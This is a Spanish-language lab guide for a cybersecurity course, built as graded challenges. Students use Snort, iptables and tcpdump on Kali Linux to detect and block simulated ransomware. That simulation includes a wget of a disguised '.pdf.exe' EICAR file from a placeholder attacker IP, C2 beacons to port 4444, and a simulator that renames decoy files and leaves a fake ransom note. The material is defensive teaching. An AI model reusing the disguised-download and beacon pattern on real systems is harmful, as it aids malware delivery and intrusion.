# 🛡️ Laboratorio: IDS y Detección de Ransomware en Kali Linux

**Curso:** Ciberseguridad · Análisis de Amenazas  
**Duración estimada:** 90–120 minutos  
**Nivel:** Intermedio  
**Herramientas:** Snort, iptables, tcpdump, Python 3

---

## 🎯 Objetivos

Al finalizar este laboratorio serás capaz de:

1. Configurar y ejecutar Snort como IDS en modo análisis de tráfico.
2. Interpretar alertas generadas por Snort ante indicadores de compromiso.
3. Identificar en tráfico de red los patrones de un ataque tipo ransomware.
4. Crear reglas Snort personalizadas para detectar amenazas específicas.
5. Usar `iptables` para bloquear tráfico malicioso en un firewall de perímetro.
6. Activar un **kill switch** para detener un ataque en curso (como WannaCry).

---

## 🗺️ Topología del Laboratorio

```
┌─────────────────────────────────────────────────────────────┐
│                     Red Aislada (Host-Only)                  │
│                                                             │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐  │
│  │   VÍCTIMA    │    │  ANALISTA    │    │  ATACANTE    │  │
│  │  Kali Linux  │    │  Kali Linux  │    │  Kali Linux  │  │
│  │ 192.168.56.10│    │ 192.168.56.1 │    │192.168.56.20 │  │
│  │              │    │              │    │              │  │
│  │ Documentos   │    │ Snort IDS    │    │ Servidor     │  │
│  │ señuelo      │    │ iptables FW  │    │ "malicioso"  │  │
│  │              │    │ tcpdump      │    │ Panel C2     │  │
│  └──────┬───────┘    └──────┬───────┘    └──────┬───────┘  │
│         │                   │                   │          │
│         └───────────────────┴───────────────────┘          │
│                       Switch virtual                        │
└─────────────────────────────────────────────────────────────┘
```

> **Nota:** En este laboratorio puedes usar una **sola Kali Linux** con múltiples terminales. Las "VMs ATACANTE y VÍCTIMA" se simulan abriendo terminales adicionales y usando la IP de loopback o de la interfaz de red local.

---

## ⚠️ Aviso de Seguridad

> Este laboratorio usa **ÚNICAMENTE** herramientas seguras:
> - Archivo de prueba **EICAR** (estándar de la industria para probar IDS/AV, no es malware real).
> - Un **simulador de IOC** que solo renombra archivos señuelo y envía tráfico HTTP inofensivo.
> - **Ningún cifrado real** se produce en ningún momento.
>
> Ejecuta el laboratorio en una **red aislada** (modo Host-Only o Internal Network de VirtualBox/VMware). Nunca en una red corporativa o con adaptador en modo Bridge hacia Internet.

---

## 📋 Preparación (15 min)

### Paso 1 — Clonar el repositorio

```bash
git clone https://github.com/<tu-usuario>/lab-ids-ransomware-kali.git
cd lab-ids-ransomware-kali
chmod +x scripts/*.sh
```

### Paso 2 — Preparar el entorno

```bash
sudo bash scripts/00_preparar_entorno.sh
```

Este script verifica que tienes instalados Snort, tcpdump, Python 3 e iptables, y crea la carpeta de trabajo con 8 archivos señuelo:

```
~/lab_ransom_ids/victima_documentos/
  documento_confidencial_1.txt ... documento_confidencial_8.txt
```

**❓ Pregunta 1:** ¿Por qué es importante verificar las herramientas antes de comenzar un laboratorio de seguridad?

---

## 🔴 RETO 1 — Descarga de malware simulado y primera alerta (25 pts)

**Escenario:** Eres el analista SOC. Un empleado descargó un archivo sospechoso desde un servidor externo. Tu misión: detectarlo con Snort.

### Terminal A — Inicia el servidor malicioso (rol: Atacante)

```bash
bash scripts/01_servidor_malicioso.sh
```

Observa la IP que muestra el script. Anótala aquí: `______________________`

### Terminal B — Inicia Snort (rol: Analista)

```bash
sudo bash scripts/04_iniciar_snort.sh
```

### Terminal C — Monitorea alertas en tiempo real (rol: Analista)

```bash
bash scripts/04b_monitorear_alertas.sh
```

### Terminal D — Descarga el archivo sospechoso (rol: Víctima)

```bash
wget http://<IP_ATACANTE>:8080/Factura_Urgente_2026.pdf.exe
```

### Verifica la alerta en Terminal C

Deberás ver algo como:

```
[**] [1:9000001:1] [LAB] Descarga archivo EICAR - Test malware detectado [**]
[Priority: 1] {TCP} 192.168.56.20:8080 -> 192.168.56.10:xxxxx
```

**❓ Pregunta 2:** ¿Qué campos de la alerta Snort identifican al atacante y a la víctima?

**❓ Pregunta 3:** ¿Por qué el archivo se llama `.pdf.exe`? ¿Qué técnica de ingeniería social representa?

**❓ Pregunta 4:** Abre el archivo `snort_rules/lab_ransomware.rules` y examina la regla con `sid:9000001`. ¿Qué patrón busca en el tráfico?

---

## 🟠 RETO 2 — Detectar el beacon de ransomware (25 pts)

**Escenario:** Después de "infectarse", el equipo víctima se comunica con el servidor de Comando y Control (C2) del atacante. Debes detectar ese tráfico.

### Terminal A — Inicia el panel C2 de práctica (rol: Atacante)

```bash
python3 scripts/02_listener_c2.py
```

### Terminal D — Ejecuta el simulador de IOC (rol: Víctima)

```bash
python3 scripts/03_simulador_ioc.py <IP_ATACANTE>
```

Observa cómo el simulador:
1. Renombra los archivos señuelo a `.locked`
2. Deja una nota de rescate ficticia
3. Envía beacons al C2

Verifica que Snort generó alertas en Terminal C.

**❓ Pregunta 5:** ¿Cuántos beacons envió el simulador? ¿Cuántas alertas generó Snort?

**❓ Pregunta 6:** ¿Qué información aparece en la ruta `/beacon?id=...`? ¿Por qué un ransomware real enviría esta información al C2?

**❓ Pregunta 7:** Revisa la carpeta `victima_documentos/`. ¿Qué diferencia hay con el estado inicial? ¿Qué hace un ransomware real en lugar de renombrar?

```bash
ls ~/lab_ransom_ids/victima_documentos/
```

**❓ Pregunta 8:** Dentro del directorio del proyecto, ejecuta esto para activar el kill switch:

```bash
touch killswitch.flag
python3 scripts/03_simulador_ioc.py <IP_ATACANTE>
```

¿Qué ocurre ahora? ¿Qué es un kill switch en un ransomware real?

---

## 🔵 RETO 3 — Bloquear el C2 con iptables (25 pts)

**Escenario:** Has identificado la IP del C2. Ahora debes bloquearla en el firewall de perímetro para que ningún otro equipo de la red pueda conectarse.

### Ver las reglas actuales del firewall

```bash
sudo iptables -L FORWARD -v -n
```

**❓ Pregunta 9:** ¿Qué significa que la política de la cadena FORWARD sea ACCEPT? ¿Es esto seguro por defecto?

### Bloquear el tráfico al servidor malicioso (puerto 8080)

```bash
sudo iptables -I FORWARD -p tcp -d <IP_ATACANTE> --dport 8080 -j DROP
```

### Bloquear el tráfico al C2 (puerto 4444)

```bash
sudo iptables -I FORWARD -p tcp -d <IP_ATACANTE> --dport 4444 -j DROP
```

### Verificar que las reglas fueron agregadas

```bash
sudo iptables -L FORWARD -v -n
```

### Intentar la descarga nuevamente

```bash
wget http://<IP_ATACANTE>:8080/Factura_Urgente_2026.pdf.exe
```

**❓ Pregunta 10:** ¿Qué mensaje aparece ahora? ¿Por qué dice "Connection timed out" en lugar de "Connection refused"?

**❓ Pregunta 11:** Escribe el comando iptables para bloquear **toda la IP del atacante** (cualquier puerto). ¿Es esto mejor o peor que bloquear solo los puertos específicos?

```bash
# Escribe tu respuesta aquí:
sudo iptables -I FORWARD ____________________________________________
```

---

## 🟣 RETO 4 — Escribe tu propia regla Snort (25 pts)

**Escenario:** El atacante cambió el User-Agent de su simulador a `MiRansomware/2.0` para intentar evadir la regla existente. Debes escribir una nueva regla que lo detecte.

### Tarea

Abre el archivo `snort_rules/lab_ransomware.rules` con tu editor favorito:

```bash
nano snort_rules/lab_ransomware.rules
```

Agrega una regla con **SID 9000010** que detecte el User-Agent `MiRansomware` y genere el mensaje `"[LAB] RETO4 - Nuevo agente C2 detectado"`.

**Pista:** Usa como base la regla con `sid:9000003` que ya existe en el archivo.

### Prueba tu regla

Reinicia Snort para cargar la nueva regla y ejecuta nuevamente el simulador con el parámetro modificado (en el código fuente de `03_simulador_ioc.py`, cambia la línea `UA = "LabRansomSim/1.0"` por `UA = "MiRansomware/2.0"`).

**❓ Pregunta 12:** Pega aquí la regla Snort que escribiste:

```
# Tu regla:
alert _______________________________________________________________
```

**❓ Pregunta 13:** ¿Qué significa el campo `rev:` en una regla Snort? ¿Por qué es importante llevar ese control?

---

## 🏆 Reto BONUS — Captura el tráfico con tcpdump

Mientras el simulador envía beacons, captura el tráfico y analízalo:

```bash
# Terminal E — Capturar
sudo tcpdump -i eth0 -w ~/lab_ransom_ids/capturas/beacon_captura.pcap &

# Ejecutar el simulador...

# Detener la captura
fg   # llevar tcpdump al primer plano
# Ctrl+C

# Analizar la captura
tcpdump -r ~/lab_ransom_ids/capturas/beacon_captura.pcap -A | grep -i beacon
```

**❓ Pregunta 14:** ¿Qué ventaja aporta tener un archivo PCAP al equipo de respuesta a incidentes?

---

## ✅ Verificar tu puntuación

Al finalizar todos los retos, ejecuta:

```bash
bash scripts/06_verificar_flags.sh
```

El script comprobará automáticamente los 5 retos y mostrará tu puntuación e insignia.

| Puntuación | Insignia |
|-----------|----------|
| 100 pts   | 🥇 Cazador de Amenazas |
| 60–80 pts | 🥈 Analista SOC Jr. |
| 40–60 pts | 🥉 Aprendiz de Seguridad |
| < 40 pts  | 📚 Sigue practicando |

---

## 🔄 Restaurar el sistema

Al terminar, limpia todos los cambios:

```bash
bash scripts/05_restaurar_sistema.sh
```

---

## 📚 Glosario

| Término | Definición |
|---------|-----------|
| **IDS** | Sistema de Detección de Intrusiones: monitorea tráfico y genera alertas ante comportamientos sospechosos. |
| **Snort** | IDS/IPS de código abierto creado por Martin Roesch, ahora mantenido por Cisco. |
| **iptables** | Herramienta de filtrado de paquetes del kernel Linux; permite crear reglas de firewall. |
| **EICAR** | Archivo de prueba estándar de la industria para verificar que un AV/IDS funciona correctamente. |
| **C2 (Comando y Control)** | Servidor que un malware usa para recibir instrucciones y enviar datos robados. |
| **Beacon** | Señal periódica que un malware envía al C2 para indicar que está activo. |
| **Kill switch** | Mecanismo que detiene un malware si detecta una condición específica (como en WannaCry). |
| **IOC** | Indicador de Compromiso: evidencia observable de que un sistema fue atacado. |
| **PCAP** | Archivo de captura de paquetes de red (Packet Capture). |

---

*Laboratorio desarrollado con fines educativos. Todos los "ataques" son simulaciones inofensivas.*
